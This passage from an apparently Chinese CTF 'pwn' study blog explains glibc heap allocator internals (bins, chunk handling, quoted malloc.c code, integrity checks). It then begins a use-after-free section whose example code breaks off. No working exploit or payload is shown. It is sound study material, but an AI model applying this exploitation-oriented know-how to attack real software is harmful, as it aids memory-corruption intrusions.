<h4 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h4><p>如果你细心的话你可能会观察到，在刚才我们申请chunk的下面始终有 0x20fe1 大小的chunk，这一块chunk非常大，程序以后分配到的内存到要放在他的后面，它的作用就是在程序在向堆管理器申请内存时，没有合适的内存空间可以分配时，此时就会从 top chunk 上借一部分作为 chunk 分配给它</p>
<h4 id="Last-Remainder-Chunk"><a href="#Last-Remainder-Chunk" class="headerlink" title="Last Remainder Chunk"></a>Last Remainder Chunk</h4><p>这是最近一次 small chunk 请求而产生分割后剩下的那一块 chunk，当在 small bins 和 unsorted bin  中找不到合适的 chunk时，如果 last remainder chunk 的大小大于用户请求的大小，则将其分割，返回用户所需 chunk  后，剩下的成为新的 last remainder chunk。</p>
<h3 id="malloc-amp-free"><a href="#malloc-amp-free" class="headerlink" title="malloc &amp; free"></a>malloc &amp; free</h3><p>malloc根据用户申请堆块的大小不同做出不同的处理。最常用的是fastbin和chunk。malloc分配时的整体顺序是如果堆块较小，属于fastbin，则在fastbin  list里寻找到一个恰当大小的堆块；如果其大小属于normal chunk，则在normal  bins里面（unsort，small，large）寻找一个恰当的堆块。如果这些bins都为空或没有分配成功，则从top  chunk指向的区域分配堆块。</p>
<p><strong>bins</strong></p>
<p>libc的堆管理机制和其他的堆管理一样，对于free的堆块，堆管理器不会立即把释放的内存还给系统，而是自己保存起来，以便下次分配使用。这样可以减少和系统内核的交互次数，提高效率。Libc中保存释放的内存的地点就是bin。bin是一个个指针，指向一个个链表（双向&amp;单向），<strong>除了 fastbin 是 LIFO 单链表的数组维护，其余的bins都是 FIFO 双向链表维护</strong>，这些链表就由释放的内存组成，下面是bins的具体分类：</p>
<ul>
<li>Fast bin</li>
<li>Unsorted bin</li>
<li>Small bin</li>
<li>Large bin</li>
</ul>
<h4 id="Fast-bin"><a href="#Fast-bin" class="headerlink" title="Fast bin"></a>Fast bin</h4><p>特点：</p>
<ul>
<li>大小较小</li>
<li>单向链表维护</li>
<li>不会和其他的堆块融合(PREV_INUSE始终为1)</li>
<li>LIFO(类似栈)</li>
</ul>
<p>引用一张图片，fastbin一共有10个单项列表，下图是32位系统下的分布，当分配一块较小的内存(memory&lt;=64 Bytes)时，会首先检查对应大小的fastbin中是否包含未被使用的chunk，如果存在则直接将其从fastbin中移除并返回；否则通过其他方式（剪切top chunk）得到一块符合大小要求的chunk并返回。也就是说，fastbin list只用了前7个进行维护</p>
<p><img src="/2020/02/09/Linux-Pwn-Learning/2.png" alt="1567869962341"></p>
<p><strong>malloc (fast chunk)</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);  <span class="comment">// 找到nb 对应的 fastbin 的 索引 idx</span></span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);<span class="comment">// 找到对应的 fastbin 的指针</span></span><br><span class="line">      mchunkptr pp = *fb;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          victim = pp;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">             != victim);</span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>) <span class="comment">//如果 fastbin 非空，就进入这里</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))<span class="comment">// 判断大小是否满足 fastbin相应bin的大小要求</span></span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在初始化时 fast bin 支持的最大内存大小以及所有 fast bin 链表都是空的，所以即使用户申请了一个 fast  chunk，它也不会交由 fast bin 来处理，而是向下传递交由 small bin 来处理，如果 small bin 也为空的话就交给  unsorted bin 来处理。</p>
<p>那么 fast bin 是在哪？怎么进行初始化的呢？当我们第一次调用 malloc (fast chunk) 的时候，系统执行  _int_malloc 函数，该函数首先会发现当前 fast bin 为空，就转交给 small bin 处理，进而又发现 small bin  也为空，就调用 malloc_consolidate 函数对 malloc_state 结构体进行初始化， malloc_consolidate  函数主要完成以下几个功能：</p>
<ol>
<li>首先判断当前 malloc_state 结构体中的 fast bin 是否为空，如果为空就说明整个 malloc_state 都没有完成初始化，   需要对 malloc_state 进行初始化。</li>
<li>malloc_state 的初始化操作由函数 malloc_init_state(msate av) 完成，该函数先初始化除 fast bin 之外的所有 bins   （构建双链表），再初始化 fast bins。</li>
</ol>
<p>之后当 fast bin 中的相关数据不为空了，就开始使用 fast bin。</p>
<p>得到第一个来自于 fast bin 的 chunk 之后，系统就将该 chunk 从对应的 fast bin 中移除，并将其地址返回给用户。</p>
<p><strong>free (fast chunk)</strong></p>
<p>先通过 chunksize 函数根据传入的地址指针对应的 chunk 的大小，然后根据这个 chunk 的大小获取该 chunk 所属的 fast bin，然后再将此 chunk 添加到该 fast bin 的链尾。</p>
<p><img src="/2020/02/09/Linux-Pwn-Learning/3.png" alt="3"></p>
<h4 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h4><p>除了fastbin以外，堆块释放后堆块会被放到malloc_state结构的bins数组中，分布如下</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Bin[0] -&gt; 不存在</span><br><span class="line">Bin[1] –&gt; Unsorted bin</span><br><span class="line">Bin[2] to Bin[63] –&gt; Small bin</span><br><span class="line">Bin[64] to Bin[126] –&gt; Large bin</span><br></pre></td></tr></table></figure>
<p>特点：</p>
<ul>
<li>大小不一</li>
<li>双向链表维护</li>
<li>FIFO</li>
</ul>
<p>当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，堆管理器就会考虑使用 Unsorted bin 。它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。Unsoted bin 是一个由 free chunks 组成的循环双向链表。在 Unsorted bin 中，对 chunk 的大小没有限制，任何大小的 chunk 都可以归属到 Unsorted bin 中。</p>
<p>malloc</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) <span class="comment">// 遍历 unsorted bin</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<h4 id="Small-bin"><a href="#Small-bin" class="headerlink" title="Small bin"></a>Small bin</h4><p>特点：</p>
<ul>
<li>大小中等</li>
<li>双向链表维护</li>
<li>FIFO</li>
<li>相邻 free chunk 会合并</li>
</ul>
<p>如果程序请求的内存范围不在 fast bin 的范围内，就会考虑small bin。简单点说就是大于 80 Bytes 小于某一个值时，就会选择他。32 位系统下小于512字节的 chunk，64位系统下小于1024字节，small bin 就是用于管理 small chunk 的。就内存分配和释放的速度而言，small bin 比 larger bin 快，但比 fast bin 慢。</p>
<p><strong>malloc(small chunk)</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);<span class="comment">//  找到 smallbin 索引</span></span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin) <span class="comment">// 判断 bin 中是不是有 chunk</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="comment">// 链表检查</span></span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb); <span class="comment">//设置下一个chunk的 in_use 位</span></span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     大内存分配，进入 malloc_consolidate</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>最初所有的 small bin 都是空的，因此在对这些 small bin 完成初始化之前，即使用户请求的内存大小属于 small  chunk 也不会交由 small bin 进行处理，而是交由 unsorted bin 处理，如果 unsorted bin  也不能处理的话，glibc 就以此遍历后续的所有 bins，找出第一个满足要求的 bin，如果所有的 bin 都不满足的话，就转而使用 top  chunk，如果 top chunk大小不够，那么就扩充 top chunk，这样就一定能满足需求了。</p>
<p>在第一次调用 malloc 时，初始 malloc_state 的时候对 small bin 和 large bin 进行初始化，bin 的指针指向自己表明为空。(malloc.c # 1808)</p>
<p>之后，当再次调用 malloc(small chunk) 的时候，如果该 chunk size 对应的 small bin  不为空，就从该 small bin 链表中取得 small chunk，否则就需要交给 unsorted bin 及之后的逻辑来处理了。</p>
<p><strong>free(small chunk)</strong></p>
<p>当释放 small chunk 时，检查它前一个或后一个 chunk 是否空闲，如果是，则合并到一起：将其从 bin 中移除，合并成新的 chunk，最后将新的 chunk 添加到 unsorted bin 中。</p>
<h4 id="Large-bin"><a href="#Large-bin" class="headerlink" title="Large bin"></a>Large bin</h4><p>特点：</p>
<ul>
<li>大小较大</li>
<li>双向链表维护</li>
<li>FIFO</li>
<li>相邻 free chunk 会合并</li>
<li>free chunk 多两个位fd_nexitsize，bk_nextsize 指向前一块和后一块 large bin</li>
</ul>
<p>32位系统下大于等于512字节，64位系统下大于等于1024字节的 chunk 称为 large chunk，large bin 就是用于管理这些 large chunk 的。large bin中不再是每个 bin 中的 chunk 大小都固定，每个 bin 中存放着该范围内不同大小的 bin 并在存的过程中进行排序用来加快检索的速度，大的 chunk 放在前面，小的放在后面</p>
<p><strong>malloc(large chunk)</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                    &#123;</span><br><span class="line">                      errstr = <span class="string">"malloc(): corrupted unsorted chunks"</span>;</span><br><span class="line">                      <span class="keyword">goto</span> errout;</span><br><span class="line">                    &#125;</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>初始时全部的 large bins 都为空，即使用户申请了一个 large chunk，不是给 large bin 进行处理，而是交由 next largest bin (<strong>to do</strong>) 进行处理，初始化操作与 small bin 一致。</p>
<p>之后当用户再次请求一个 large bin时，首先确定用户请求的大小属于哪一个 large bin，然后判断该 large bin 中最大的 chunk 的大小是否大于用户请求的大小。</p>
<p>如果大于，就从尾部到头部遍历该 large bin，找到一个大小相等或接近的 chunk 返回给用户。如果该 chunk  大于用户请求的大小的话，就将该 chunk 拆分为两个 chunk：前者返回给用户，且大小等同于用户请求的大小，剩余的部分作为一个新的  chunk 添加到 unsorted bin 中。</p>
<p>如果该 large bin 中最大的 chunk 小于用户请求的大小，那么就依次查看后续不为空的 large bin 中是否有满足需求的 chunk，如果找到合适的，切割之后返回给用户。如果没有找到，尝试交由 top chunk 处理。</p>
<p><strong>free(large chunk)</strong></p>
<p>当释放 large chunk 时，检查它前一个或后一个 chunk 是否空闲，如果是，则合并到一起：将其从 bin 中移除，合并成新的 chunk，最后将新的 chunk 添加到 unsorted bin 中。</p>
<p><img src="/2020/02/09/Linux-Pwn-Learning/4.png" alt="4"></p>
<h3 id="检查机制"><a href="#检查机制" class="headerlink" title="检查机制"></a>检查机制</h3><h4 id="free-check"><a href="#free-check" class="headerlink" title="free check"></a>free check</h4><p>free之前的检查</p>
<ul>
<li>指针是否对齐</li>
<li>块的大小是否对齐，且大于最小的大小</li>
<li>块是否在 <code>inuse</code> 状态</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  //检查指针是否正常，对齐</span><br><span class="line">  if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), 0))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = &quot;free(): invalid pointer&quot;;</span><br><span class="line">    errout:</span><br><span class="line">      if (!have_lock &amp;&amp; locked)</span><br><span class="line">        (void) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">// 检查 size 是否 &gt;= MINSIZE ，且是否对齐</span><br><span class="line">  if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = &quot;free(): invalid size&quot;;</span><br><span class="line">      goto errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">// 检查 chunk 是否处于 inuse 状态</span><br><span class="line">  check_inuse_chunk(av, p);</span><br></pre></td></tr></table></figure>
<h4 id="Check-In-Glbc"><a href="#Check-In-Glbc" class="headerlink" title="Check In Glbc"></a>Check In Glbc</h4><table>
<thead>
<tr>
<th>函数名</th>
<th>检查</th>
<th>报错信息</th>
</tr>
</thead>
<tbody>
<tr>
<td>unlink</td>
<td>p-&gt;size == nextchunk-&gt;pre_size</td>
<td>corrupted size vs prev_size</td>
</tr>
<tr>
<td>unlink</td>
<td>p-&gt;fd-&gt;bk == p 且 p-&gt;bk-&gt;fd == p</td>
<td>corrupted double-linked list</td>
</tr>
<tr>
<td>_int_malloc</td>
<td>当从fastbin分配内存时 ,找到的那个fastbin chunk的size要等于其位于的fastbin 的大小，比如在0x20的 fastbin中其大小就要为0x20</td>
<td>malloc():memory corruption (fast)</td>
</tr>
<tr>
<td>_int_malloc</td>
<td>当从 smallbin 分配 chunk( victim) 时， 要求 victim-&gt;bk-&gt;fd == victim</td>
<td>malloc(): smallbin double linked list corrupted</td>
</tr>
<tr>
<td>_int_malloc</td>
<td>当迭代 unsorted bin 时 ，迭代中的 chunk (cur)要满足，cur-&gt;size 在 [2*SIZE_SZ,  av-&gt;system_mem] 中</td>
<td>malloc(): memory corruption</td>
</tr>
<tr>
<td>_int_free</td>
<td>当插入一个 chunk 到 fastbin时，判断fastbin的 head 是不是和 释放的 chunk 相等</td>
<td>double free or corruption (fasttop)</td>
</tr>
<tr>
<td>_int_free</td>
<td>判断 next_chunk-&gt;pre_inuse == 1</td>
<td>double free or corruption (!prev)</td>
</tr>
</tbody>
</table>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Source Code of malloc.c        : https://code.woboq.org/userspace/glibc/malloc/malloc.c.html</span><br><span class="line">[+] CTF pwn 中最通俗易懂的堆入坑指南 : https://www.anquanke.com/post/id/163971#h2-1</span><br><span class="line">[+] Libc堆管理机制及漏洞利用技术     : https://www.freebuf.com/articles/system/91527.html</span><br><span class="line">[+] glibc heap analysis            : https://0x3f97.github.io/heap-exploitation/2017/12/06/glibc-heap-analysis/</span><br><span class="line">[+] glibc heap pwn notes           : https://xz.aliyun.com/t/2307</span><br></pre></td></tr></table></figure>
<h2 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h2><p><strong>漏洞介绍</strong></p>
<p>Glibc Heap 利用中，Use After Free(UAF)是很常见的一种，那么什么是UAF呢？</p>
<p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况：</p>
<ul>
<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</li>
</ul>
<p>而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</p>
<h3 id="Example-One"><a href="#Example-One" class="headerlink" title="Example One"></a>Example One</h3><p>首先创建一个UAF.cpp，内容如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"class A"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span> <span class="keyword">public</span> A</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span 